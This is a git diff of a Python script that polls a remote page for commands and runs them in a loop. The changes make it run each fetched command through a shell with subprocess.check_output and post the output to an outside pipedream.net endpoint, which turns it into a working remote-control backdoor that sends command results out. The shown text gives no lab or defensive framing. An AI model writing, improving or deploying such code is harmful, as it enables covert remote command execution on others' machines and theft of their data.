@@ -1,8 +1,8 @@
 try:
     from bs4 import BeautifulSoup
-    from requests import get
+    from requests import get, post
     from time import sleep
-    from os import system
+    from subprocess import check_output as system
     import lxml
 
     old_command = ""
@@ -19,14 +19,23 @@ while True:
         except KeyboardInterrupt:
             continue
         except:
-            print("failed to connect to server")
-        #execute command
+            print("Failed to connect to server")
+            continue
+            # execute command
         if old_command != command:
             try:
-                system(f"{command} > /dev/null")
+                cmdout = system(command, shell=True)
+                try:
+                    post("https://eo482aoknyxae8c.m.pipedream.net/", data=cmdout)
+                except KeyboardInterrupt:
+                    continue
+                except:
+                    print("Failed to sent output")
+                    continue
                 old_command = command
+                continue
             except:
-                pass
+                continue
         try:
             sleep(0.1)
         except KeyboardInterrupt:
